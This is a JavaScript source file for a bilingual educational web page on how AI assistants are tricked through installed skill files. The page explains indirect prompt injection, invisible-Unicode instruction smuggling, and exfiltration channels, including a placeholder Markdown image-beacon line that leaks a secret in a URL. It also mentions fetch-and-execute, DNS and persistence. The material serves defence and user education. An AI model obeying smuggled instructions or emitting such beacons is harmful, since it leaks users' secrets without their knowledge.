import { href, SITE } from '../layout.mjs';

export const slug = 'learn';

export const meta = {
  en: {
    title: 'Learn — how AI assistants can be tricked, in plain language · Skillry',
    description:
      'What an AI assistant actually loads, how text can hide instructions, what can go wrong, and what you can do about it. Two depths: plain language, or the technical detail.',
  },
  de: {
    title: 'Lernen — wie KI-Assistenten ausgetrickst werden, im Klartext · Skillry',
    description:
      'Was ein KI-Assistent wirklich lädt, wie Text Anweisungen verstecken kann, was schiefgehen kann und was du dagegen tun kannst. Zwei Tiefen: Klartext oder technisches Detail.',
  },
};

const T = {
  en: {
    eyebrow: 'Learn',
    h1: 'How AI assistants get tricked, and what you can do.',
    lede:
      'No fear-mongering and no jargon wall. Every section comes at two depths — pick the one you want, switch any time. Nothing here needs you to be a programmer.',
    tocTitle: 'On this page',
    tocLabel: 'Sections of this page',
    basic: 'Plain language',
    deep: 'Technical detail',
    toggleLabel: 'Choose a depth',

    topics: [
      {
        n: '01',
        h: 'What does an assistant actually load?',
        basic: `<p>When you ask an AI assistant to do something, it doesn't only see your message. It also sees instructions it was given beforehand — including files you installed called <strong>skills</strong>.</p>
<p>A skill is a plain text file. It says things like <em>"when the user mentions a PDF, do this."</em> You can open one in Notepad. There is no compiler, no signature, no app store review. You download it, drop it in a folder, and from then on your assistant reads it every time it might be relevant.</p>
<p>That is genuinely useful — it is how you teach an assistant your workflow. It also means <strong>whoever wrote that file is talking to your assistant, in your session, with your permissions.</strong></p>`,
        deep: `<p>A skill is a Markdown file with YAML front-matter, conventionally <code>SKILL.md</code>. The front-matter carries a <code>name</code>, a <code>description</code> the runtime uses to decide relevance, and often an <code>allowed-tools</code> list. The body is prose instructions injected into the model's context.</p>
<p>Three properties make this a supply chain rather than a config format:</p>
<ul>
<li><strong>No integrity layer.</strong> No signature, no checksum, no publisher identity. The file is trusted because it is on disk.</li>
<li><strong>Context-level privilege.</strong> Injected text is not sandboxed from your request. It arrives as instruction, not as data.</li>
<li><strong>Silent updates.</strong> Pull the repository, sync the plugin, and the file that runs tomorrow is not the file you read today.</li>
</ul>
<p><code>allowed-tools</code> constrains the <em>verb</em>. It says nothing about the <em>object</em> — <code>Read</code> is a true and useless description of a skill that reads your private keys.</p>`,
      },
      {
        n: '02',
        h: 'How can text hide something?',
        basic: `<p>Not every character in a text file makes a mark on the screen. Some are there to control spacing or letter shapes, and they render as nothing at all — but they still exist in the file, they survive copy and paste, and a program reading the file sees them perfectly.</p>
<p>So you can write a paragraph that looks completely normal, and slip a second, invisible paragraph in between two sentences. Your eyes see a PDF helper. The assistant reads the PDF helper <em>plus</em> the hidden part.</p>
<p>There are variations on the trick: characters from other alphabets that look identical to ours (a Russian <span class="mono">с</span> is not a Latin <span class="mono">c</span>, but you cannot tell), and characters that make a line <em>display</em> in a different order than it actually runs.</p>`,
        deep: `<p>Unicode has several ranges with no visual footprint that survive normal text handling:</p>
<ul>
<li><strong>Zero-width characters</strong> (<code>U+200B</code>–<code>U+200D</code>, <code>U+FEFF</code>) — used as bits, eight per smuggled character.</li>
<li><strong>The Tags block</strong> (<code>U+E0000</code>–<code>U+E007F</code>) — a complete shadow ASCII alphabet, offset by a fixed amount, rendering as nothing.</li>
<li><strong>Variation selectors</strong> (<code>U+FE00</code>–<code>U+FE0F</code>, <code>U+E0100</code>–<code>U+E01EF</code>) — one byte each, attaching invisibly to the preceding glyph, commonly an emoji.</li>
<li><strong>Bidirectional overrides</strong> (<code>U+202A</code>–<code>U+202E</code>) — reorder how a line displays without changing what executes. Published as <em>Trojan Source</em>.</li>
<li><strong>Confusables</strong> — mixed-script homoglyphs that defeat both a reader and a literal denylist.</li>
</ul>
<p>The countermeasure is not detection alone but <strong>recovery</strong>: decode the carrier back to text and show the reviewer the sentence. A finding that says "1,000 invisible codepoints" is a curiosity; one that prints what they spell is an argument.</p>`,
      },
      {
        n: '03',
        h: 'What can actually go wrong?',
        basic: `<p>The hidden text is an instruction, and the assistant treats instructions as instructions. The realistic bad outcomes are ordinary ones:</p>
<ul>
<li><strong>Something is read that should not be.</strong> Password files, access tokens, browser sessions.</li>
<li><strong>Something leaves your machine.</strong> Often not as an obvious upload — an image link is enough, because displaying an image means requesting a URL, and the data can ride along in that URL.</li>
<li><strong>Something is done quietly.</strong> The hidden text can ask the assistant not to mention what it did.</li>
</ul>
<p>None of that needs a clever exploit or a bug in the software. It just needs you to install a file nobody checked.</p>`,
        deep: `<p>This is <strong>indirect prompt injection</strong>: the payload arrives through content the model consumes rather than through the user turn. The interesting part is not the instruction, it is the egress channel.</p>
<ul>
<li><strong>Markdown image beacons.</strong> <code>![x](https://host/p?d=SECRET)</code> is fetched by the client at render time. No tool call, no approval prompt, and the data has already left before anyone reads the reply.</li>
<li><strong>Fetch-and-execute.</strong> A pipeline that pipes a download straight into a shell — the reviewed URL and the executed bytes are different objects, and the server picks when they differ.</li>
<li><strong>DNS.</strong> Rarely filtered, rarely logged at the same fidelity as HTTP.</li>
<li><strong>Persistence.</strong> A scheduled task or a shell profile line outlives removal of the skill entirely.</li>
</ul>
<p>Defences that only inspect tool calls miss the first one completely, which is why the image-beacon rule is scored critical.</p>`,
      },
      {
        n: '04',
        h: 'Which models and providers can you trust?',
        basic: `<p>You cannot read a model's mind, and nobody can hand you a certificate that one is honest. What you <em>can</em> control is much more practical:</p>
<ul>
<li><strong>Where it runs.</strong> A model on your own machine cannot send your files anywhere, because it has no network of its own.</li>
<li><strong>What it can reach.</strong> Most damage needs a tool — reading files, running commands, opening URLs. Grant those deliberately.</li>
<li><strong>Whether you can swap it out.</strong> Software that locks you to one provider has made the decision for you. Software that speaks a standard interface lets you change your mind.</li>
</ul>
<p>Be sceptical of anyone claiming a model is "verified safe". The honest claim is narrower and more useful: <em>this is what it can reach, and here is how you change that.</em></p>`,
        deep: `<p>Model provenance is a genuinely open problem. Weights are not meaningfully auditable by reading them, published evaluations are self-reported, and "safety-tuned" says something about refusal behaviour rather than about backdoors. Treat the model as untrusted and constrain the boundary instead:</p>
<ul>
<li><strong>Egress is the real control.</strong> Local inference removes the exfiltration channel outright. If you must use a hosted endpoint, know which one and log it.</li>
<li><strong>Tool surface over model choice.</strong> Capability granted, not model identity, determines blast radius. Enumerate what each tool can touch.</li>
<li><strong>Interface portability.</strong> An OpenAI-compatible endpoint is a commitment you can reverse; a proprietary integration is not.</li>
<li><strong>Content provenance separately.</strong> Even a perfectly honest model will faithfully follow an instruction that was smuggled into its context. Model trust and content trust are different problems, and this site is about the second one.</li>
</ul>`,
      },
      {
        n: '05',
        h: 'What should you actually do?',
        basic: `<p>Five habits, in order of how much they buy you:</p>
<ol>
<li><strong>Know what you have installed.</strong> Most people have never looked. That is the first surprise.</li>
<li><strong>Check anything from a stranger before you install it</strong> — not by squinting at it, but with something that reads the bytes.</li>
<li><strong>Write down what you approved.</strong> Then a later change becomes visible instead of invisible.</li>
<li><strong>Re-check now and then.</strong> The file that changes after you approved it is the one worth catching.</li>
<li><strong>Grant permissions narrowly.</strong> If a skill only needs to read, it does not need to run commands.</li>
</ol>`,
        deep: `<p>Operationally, the checklist maps onto four commands and a CI job:</p>
<pre><span class="c"># what is installed, and does any of it carry something hidden</span>
airlock scan --installed

<span class="c"># record the decision as a signed lockfile</span>
airlock keygen &amp;&amp; airlock lock ~/.claude/skills

<span class="c"># enforce it — exit 1 on any drift</span>
airlock verify ~/.claude/skills</pre>
<p>The verification step is the one that matters, because scanning is a point-in-time statement and skills update silently. Pin the bytes, put <code>verify</code> in continuous integration, and a change cannot reach your main branch without somebody seeing it.</p>
<p>Two failure modes worth internalising: a <em>pass</em> means no rule matched, not that the file is safe; and a heuristic finding is a prompt to look, not a verdict. Any tool that blurs those two is training you to ignore it.</p>`,
      },
    ],

    ctaH: 'Try it on your own machine',
    ctaP: 'Three commands, no account, nothing uploaded. It reads bytes and exits.',
    ctaBtn: 'Get AIRLOCK',
    ctaAlt: 'Browse the skill index',
    askH: 'Something here unclear?',
    askP: 'Ask in the forum. Beginner questions are the point of it — there is no such thing as one that is too basic.',
    askBtn: 'Go to the forum',
  },

  de: {
    eyebrow: 'Lernen',
    h1: 'Wie KI-Assistenten ausgetrickst werden — und was du tun kannst.',
    lede:
      'Keine Panikmache und keine Fachbegriff-Wand. Jeder Abschnitt kommt in zwei Tiefen — nimm die, die du willst, wechsle jederzeit. Nichts hier setzt voraus, dass du programmieren kannst.',
    tocTitle: 'Auf dieser Seite',
    tocLabel: 'Abschnitte dieser Seite',
    basic: 'Klartext',
    deep: 'Technisches Detail',
    toggleLabel: 'Tiefe wählen',

    topics: [
      {
        n: '01',
        h: 'Was lädt ein Assistent eigentlich?',
        basic: `<p>Wenn du einen KI-Assistenten um etwas bittest, sieht er nicht nur deine Nachricht. Er sieht auch Anweisungen, die er vorher bekommen hat — darunter Dateien, die du installiert hast: <strong>Skills</strong>.</p>
<p>Ein Skill ist eine simple Textdatei. Da steht sowas drin wie <em>„wenn der Nutzer ein PDF erwähnt, mach Folgendes."</em> Du kannst sie im Editor aufmachen. Es gibt keinen Compiler, keine Signatur, keine App-Store-Prüfung. Du lädst sie herunter, legst sie in einen Ordner, und ab dann liest dein Assistent sie jedes Mal, wenn sie relevant sein könnte.</p>
<p>Das ist wirklich nützlich — so bringt man einem Assistenten den eigenen Arbeitsablauf bei. Es heißt aber auch: <strong>Wer diese Datei geschrieben hat, spricht mit deinem Assistenten, in deiner Sitzung, mit deinen Rechten.</strong></p>`,
        deep: `<p>Ein Skill ist eine Markdown-Datei mit YAML-Frontmatter, üblicherweise <code>SKILL.md</code>. Das Frontmatter trägt <code>name</code>, eine <code>description</code>, anhand derer die Laufzeit über Relevanz entscheidet, und oft eine <code>allowed-tools</code>-Liste. Der Body sind Prosa-Anweisungen, die in den Kontext des Modells injiziert werden.</p>
<p>Drei Eigenschaften machen daraus eine Supply Chain statt eines Konfigurationsformats:</p>
<ul>
<li><strong>Keine Integritätsschicht.</strong> Keine Signatur, keine Prüfsumme, keine Herausgeber-Identität. Die Datei wird vertraut, weil sie auf der Platte liegt.</li>
<li><strong>Privileg auf Kontextebene.</strong> Injizierter Text ist nicht von deiner Anfrage getrennt. Er kommt als Anweisung an, nicht als Daten.</li>
<li><strong>Stille Updates.</strong> Repository ziehen, Plugin synchronisieren — und die Datei, die morgen läuft, ist nicht die, die du heute gelesen hast.</li>
</ul>
<p><code>allowed-tools</code> beschränkt das <em>Verb</em>. Über das <em>Objekt</em> sagt es nichts — <code>Read</code> ist über einen Skill, der deine privaten Schlüssel liest, eine wahre und nutzlose Beschreibung.</p>`,
      },
      {
        n: '02',
        h: 'Wie kann Text etwas verstecken?',
        basic: `<p>Nicht jedes Zeichen in einer Textdatei hinterlässt eine Spur auf dem Bildschirm. Manche steuern Abstände oder Buchstabenformen und werden als gar nichts dargestellt — sie stehen aber trotzdem in der Datei, überleben Copy-and-Paste, und ein Programm, das die Datei liest, sieht sie einwandfrei.</p>
<p>Du kannst also einen völlig normal aussehenden Absatz schreiben und einen zweiten, unsichtbaren zwischen zwei Sätze schieben. Deine Augen sehen eine PDF-Hilfe. Der Assistent liest die PDF-Hilfe <em>plus</em> den versteckten Teil.</p>
<p>Es gibt Varianten davon: Zeichen aus anderen Alphabeten, die identisch aussehen (ein russisches <span class="mono">с</span> ist kein lateinisches <span class="mono">c</span>, aber man sieht es nicht), und Zeichen, die eine Zeile in einer anderen Reihenfolge <em>anzeigen</em> als sie tatsächlich läuft.</p>`,
        deep: `<p>Unicode hat mehrere Bereiche ohne visuelle Spur, die normale Textverarbeitung überleben:</p>
<ul>
<li><strong>Zero-Width-Zeichen</strong> (<code>U+200B</code>–<code>U+200D</code>, <code>U+FEFF</code>) — als Bits benutzt, acht pro geschmuggeltem Zeichen.</li>
<li><strong>Der Tags-Block</strong> (<code>U+E0000</code>–<code>U+E007F</code>) — ein vollständiges Schatten-ASCII-Alphabet mit festem Versatz, das als nichts dargestellt wird.</li>
<li><strong>Variation Selectors</strong> (<code>U+FE00</code>–<code>U+FE0F</code>, <code>U+E0100</code>–<code>U+E01EF</code>) — je ein Byte, unsichtbar an das vorherige Zeichen gebunden, häufig ein Emoji.</li>
<li><strong>Bidirektionale Overrides</strong> (<code>U+202A</code>–<code>U+202E</code>) — ändern die Anzeigereihenfolge, ohne zu ändern, was ausgeführt wird. Veröffentlicht als <em>Trojan Source</em>.</li>
<li><strong>Confusables</strong> — Homoglyphen aus gemischten Schriften, die sowohl einen Leser als auch eine wörtliche Sperrliste aushebeln.</li>
</ul>
<p>Die Gegenmaßnahme ist nicht Erkennung allein, sondern <strong>Rückgewinnung</strong>: den Träger zurück in Text dekodieren und dem Prüfenden den Satz zeigen. Ein Befund „1.000 unsichtbare Codepoints" ist eine Kuriosität; einer, der ausgibt, was sie buchstabieren, ist ein Argument.</p>`,
      },
      {
        n: '03',
        h: 'Was kann tatsächlich schiefgehen?',
        basic: `<p>Der versteckte Text ist eine Anweisung, und der Assistent behandelt Anweisungen als Anweisungen. Die realistisch schlechten Ausgänge sind ganz gewöhnliche:</p>
<ul>
<li><strong>Etwas wird gelesen, das nicht gelesen werden sollte.</strong> Passwortdateien, Zugangstoken, Browser-Sitzungen.</li>
<li><strong>Etwas verlässt deine Maschine.</strong> Oft nicht als offensichtlicher Upload — ein Bild-Link reicht, denn ein Bild anzuzeigen heißt, eine URL abzurufen, und die Daten können in dieser URL mitreisen.</li>
<li><strong>Etwas passiert still.</strong> Der versteckte Text kann den Assistenten bitten, nicht zu erwähnen, was er getan hat.</li>
</ul>
<p>Nichts davon braucht einen raffinierten Exploit oder einen Fehler in der Software. Es braucht nur, dass du eine Datei installierst, die niemand geprüft hat.</p>`,
        deep: `<p>Das ist <strong>indirekte Prompt Injection</strong>: Der Payload kommt über Inhalte an, die das Modell konsumiert, nicht über den Nutzer-Turn. Das Interessante ist nicht die Anweisung, sondern der Abflusskanal.</p>
<ul>
<li><strong>Markdown-Bild-Beacons.</strong> <code>![x](https://host/p?d=SECRET)</code> wird vom Client beim Rendern abgerufen. Kein Tool-Aufruf, keine Rückfrage — die Daten sind schon draußen, bevor jemand die Antwort liest.</li>
<li><strong>Fetch-and-Execute.</strong> Eine Pipeline, die einen Download direkt in eine Shell schiebt — die geprüfte URL und die ausgeführten Bytes sind verschiedene Objekte, und der Server bestimmt, wann sie sich unterscheiden.</li>
<li><strong>DNS.</strong> Selten gefiltert, selten so genau protokolliert wie HTTP.</li>
<li><strong>Persistenz.</strong> Eine geplante Aufgabe oder eine Zeile im Shell-Profil überlebt das Entfernen des Skills komplett.</li>
</ul>
<p>Abwehrmaßnahmen, die nur Tool-Aufrufe prüfen, übersehen den ersten Fall vollständig — deshalb ist die Bild-Beacon-Regel als kritisch eingestuft.</p>`,
      },
      {
        n: '04',
        h: 'Welchen Modellen und Anbietern kannst du trauen?',
        basic: `<p>Du kannst einem Modell nicht in den Kopf schauen, und niemand kann dir ein Zertifikat ausstellen, dass eines ehrlich ist. Was du <em>sehr wohl</em> kontrollieren kannst, ist viel praktischer:</p>
<ul>
<li><strong>Wo es läuft.</strong> Ein Modell auf deiner eigenen Maschine kann deine Dateien nirgendwohin schicken, weil es kein eigenes Netz hat.</li>
<li><strong>Woran es rankommt.</strong> Der meiste Schaden braucht ein Werkzeug — Dateien lesen, Befehle ausführen, URLs öffnen. Vergib das bewusst.</li>
<li><strong>Ob du wechseln kannst.</strong> Software, die dich an einen Anbieter bindet, hat die Entscheidung für dich getroffen. Software, die eine Standardschnittstelle spricht, lässt dich umentscheiden.</li>
</ul>
<p>Sei skeptisch bei jedem, der behauptet, ein Modell sei „geprüft sicher". Die ehrliche Aussage ist enger und nützlicher: <em>Das hier kann es erreichen, und so änderst du das.</em></p>`,
        deep: `<p>Modell-Provenienz ist ein wirklich offenes Problem. Gewichte lassen sich durch Lesen nicht sinnvoll auditieren, veröffentlichte Evaluationen sind selbst berichtet, und „safety-tuned" sagt etwas über Ablehnungsverhalten aus, nicht über Hintertüren. Behandle das Modell als nicht vertrauenswürdig und beschränke stattdessen die Grenze:</p>
<ul>
<li><strong>Egress ist die eigentliche Kontrolle.</strong> Lokale Inferenz entfernt den Exfiltrationskanal komplett. Wenn ein gehosteter Endpunkt sein muss: wissen welcher, und protokollieren.</li>
<li><strong>Werkzeugfläche vor Modellwahl.</strong> Die vergebene Fähigkeit bestimmt den Wirkungsradius, nicht die Modellidentität. Zähl auf, was jedes Werkzeug anfassen kann.</li>
<li><strong>Portable Schnittstelle.</strong> Ein OpenAI-kompatibler Endpunkt ist eine umkehrbare Festlegung; eine proprietäre Integration nicht.</li>
<li><strong>Inhalts-Provenienz getrennt betrachten.</strong> Auch ein vollkommen ehrliches Modell befolgt getreu eine Anweisung, die in seinen Kontext geschmuggelt wurde. Modellvertrauen und Inhaltsvertrauen sind verschiedene Probleme — und diese Seite handelt vom zweiten.</li>
</ul>`,
      },
      {
        n: '05',
        h: 'Was solltest du konkret tun?',
        basic: `<p>Fünf Gewohnheiten, sortiert danach, wie viel sie dir bringen:</p>
<ol>
<li><strong>Wissen, was du installiert hast.</strong> Die meisten haben nie nachgesehen. Das ist die erste Überraschung.</li>
<li><strong>Alles von Fremden prüfen, bevor du es installierst</strong> — nicht durch Draufschielen, sondern mit etwas, das die Bytes liest.</li>
<li><strong>Aufschreiben, was du freigegeben hast.</strong> Dann wird eine spätere Änderung sichtbar statt unsichtbar.</li>
<li><strong>Ab und zu nachprüfen.</strong> Die Datei, die sich nach deiner Freigabe ändert, ist die, die es zu erwischen gilt.</li>
<li><strong>Rechte eng vergeben.</strong> Wenn ein Skill nur lesen muss, braucht er keine Befehlsausführung.</li>
</ol>`,
        deep: `<p>Operativ bildet sich die Checkliste auf vier Befehle und einen CI-Job ab:</p>
<pre><span class="c"># was ist installiert, und trägt etwas davon Verstecktes</span>
airlock scan --installed

<span class="c"># die Entscheidung als signiertes Lockfile festhalten</span>
airlock keygen &amp;&amp; airlock lock ~/.claude/skills

<span class="c"># durchsetzen — Exit 1 bei jeder Drift</span>
airlock verify ~/.claude/skills</pre>
<p>Der Verifikationsschritt ist der entscheidende, denn ein Scan ist eine Momentaufnahme und Skills aktualisieren sich still. Bytes festnageln, <code>verify</code> in die CI, und eine Änderung kommt nicht in den Hauptbranch, ohne dass jemand sie sieht.</p>
<p>Zwei Fehlermodi, die man verinnerlichen sollte: Ein <em>pass</em> heißt, dass keine Regel angeschlagen hat — nicht, dass die Datei sicher ist. Und ein heuristischer Befund heißt „schau hin", nicht „Urteil". Jedes Werkzeug, das diese beiden verwischt, erzieht dich dazu, es zu ignorieren.</p>`,
      },
    ],

    ctaH: 'Auf der eigenen Maschine ausprobieren',
    ctaP: 'Drei Befehle, kein Konto, nichts wird hochgeladen. Es liest Bytes und beendet sich.',
    ctaBtn: 'AIRLOCK holen',
    ctaAlt: 'Skill-Index durchsuchen',
    askH: 'Etwas hier unklar?',
    askP: 'Frag im Forum. Einsteigerfragen sind genau der Sinn davon — es gibt keine, die zu einfach wäre.',
    askBtn: 'Zum Forum',
  },
};

export function body(lang) {
  const t = T[lang];

  /*
   * ══ EIN VERZEICHNIS, WEIL DIE SEITE FUENF BILDSCHIRME LANG IST ═════════
   *
   * Gemessen: 4087px Hoehe, sieben Abschnitte, kein einziger Hinweis auf die
   * Form des Ganzen. Wer hier landet, sieht eine Ueberschrift und danach
   * Text — er weiss nicht, wie lang es wird, wo er steht, und kann nicht zu
   * der einen Frage springen, die er wirklich hat.
   *
   * Der Anker kommt aus `anchorHeadings` in layout.mjs und wird hier mit
   * DERSELBEN Regel gebildet: kleingeschrieben, alles ausser Buchstaben und
   * Ziffern zu Bindestrichen. Zwei Listen von Hand waeren zwei, die
   * auseinanderlaufen — deshalb entsteht das Verzeichnis aus derselben
   * Datenquelle wie die Abschnitte darunter.
   */
  const anker = (text) => String(text)
    .toLowerCase()
    .replace(/<[^>]*>/g, '')
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '');

  const verzeichnis = `
<nav class="wegweiser" aria-label="${t.tocLabel}">
  <span class="wegweiser-titel">${t.tocTitle}</span>
  <ol>
    ${[
      ...t.topics.map((topic) => [topic.n, topic.h]),
      /*
       * Die letzten beiden Abschnitte stehen nicht in `topics`, sondern als
       * feste Bloecke am Seitenende — sie sind trotzdem Abschnitte dieser
       * Seite. Ohne sie zaehlte das Verzeichnis fuenf, waehrend sieben
       * Ueberschriften da sind, und behauptete damit, die Seite ende frueher.
       * Ein unvollstaendiges Verzeichnis ist schlechter als gar keins.
       *
       * Sie tragen keine Nummer, weil sie keine Lernabschnitte sind: der eine
       * ist der naechste Schritt, der andere die Hilfe.
       */
      ['', t.ctaH],
      ['', t.askH],
    ].map(([n, h]) => `<li><a href="#${anker(h)}">
      <span class="wegweiser-n">${n || '·'}</span>${h}</a></li>`).join('')}
  </ol>
</nav>`;

  const topics = t.topics
    .map(
      (topic) => `
<article class="stack" style="padding-block:clamp(28px,4vw,44px);border-top:1px solid var(--border)">
  <span class="eyebrow">${topic.n}</span>
  <h2>${topic.h}</h2>
  <div class="lvl basic on narrow stack">${topic.basic}</div>
  <div class="lvl deep narrow stack">${topic.deep}</div>
</article>`,
    )
    .join('');

  return `
<section class="hero hero-stage" style="padding-bottom:20px">
  <div class="wrap stack">
    <span class="eyebrow">${t.eyebrow}</span>
    <h1>${t.h1}</h1>
    <p class="lede">${t.lede}</p>
    <div class="btn-row" style="margin-top:1.4rem">
      <div class="level-toggle" role="group" aria-label="${t.toggleLabel}">
        <button type="button" data-level="basic" aria-pressed="true">${t.basic}</button>
        <button type="button" data-level="deep" aria-pressed="false">${t.deep}</button>
      </div>
    </div>
    ${verzeichnis}
  </div>
</section>

<section style="padding-top:0">
  <div class="wrap">${topics}</div>
</section>

<hr class="divider">

<section>
  <div class="wrap grid grid-2">
    <div class="stack">
      <h2>${t.ctaH}</h2>
      <p class="muted">${t.ctaP}</p>
      <div class="btn-row">
        <a class="btn btn-primary" href="${SITE.repoAirlock}">${t.ctaBtn}</a>
        <a class="btn" href="${href(lang, 'skills')}">${t.ctaAlt}</a>
      </div>
    </div>
    <div class="stack">
      <h2>${t.askH}</h2>
      <p class="muted">${t.askP}</p>
      <div class="btn-row"><a class="btn" href="${href(lang, 'forum')}">${t.askBtn}</a></div>
    </div>
  </div>
</section>
`;
}

export const script = () => `
(function () {
  var buttons = [].slice.call(document.querySelectorAll('.level-toggle button'));
  if (!buttons.length) return;

  function set(level) {
    buttons.forEach(function (b) { b.setAttribute('aria-pressed', String(b.dataset.level === level)); });
    [].forEach.call(document.querySelectorAll('.lvl'), function (el) {
      el.classList.toggle('on', el.classList.contains(level));
    });
    try { localStorage.setItem('level', level); } catch (e) {}
  }

  buttons.forEach(function (b) { b.addEventListener('click', function () { set(b.dataset.level); }); });

  // Remember the depth someone picked; they rarely want the other one next time.
  try {
    var saved = localStorage.getItem('level');
    if (saved === 'deep' || saved === 'basic') set(saved);
  } catch (e) {}
})();`;
